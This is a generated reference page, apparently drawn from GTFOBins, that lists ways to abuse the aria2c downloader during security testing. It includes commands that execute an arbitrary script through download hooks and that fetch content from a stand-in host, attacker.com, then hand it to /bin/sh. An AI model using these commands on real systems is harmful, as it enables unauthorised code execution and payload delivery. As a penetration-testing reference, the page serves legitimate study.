---
parsed_by: focuslocust
source: commands
type: generated
---
# aria2c Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## aria2c

Tool page: [aria2c](../../tools/linux/aria2c.md)

### command

```text
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/aria2c` |
| Evidence | Function example preserved from source parser. |

### command

```text
aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/aria2c` |
| Evidence | Function example preserved from source parser. |

### download

```text
aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/aria2c` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
aria2c -i /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/aria2c` |
| Evidence | Function example preserved from source parser. |
